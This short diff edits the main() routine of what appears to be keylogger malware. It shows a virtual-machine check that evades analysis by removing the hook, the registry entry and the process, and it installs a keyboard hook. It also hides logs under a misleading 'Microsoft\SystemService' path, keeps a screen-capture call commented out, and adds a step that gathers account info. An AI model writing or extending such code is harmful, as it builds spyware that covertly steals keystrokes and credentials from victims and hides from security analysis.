@@ -14,7 +14,6 @@ int main() {
 
 #ifndef DEBUG_BUILD
   if (Sys::CheckForVirtualMachine()) {
-    DEB("Virtual Machine")
 	KeyHook::UninstallHook();
 	Sys::RemoveFromRegistry();
 	KeyHook::KillProcess();
@@ -24,6 +23,8 @@ int main() {
   Crypt::GenerateKeys();
   KeyHook::InstallHook();
 
+  Stream::GetAccountInfo(info);
+
   std::string path = Stream::GetPath("\\Microsoft\\SystemService");
 
   Stream::MakeDir(path);
@@ -32,6 +33,7 @@ int main() {
   Stream::WriteLog("[*] BOOT [*]",
 				   KeyHook::activeProcess,
 				   false);
+
   /*Screen::CaptureScreen(path,
 						"winpst",
 						true,
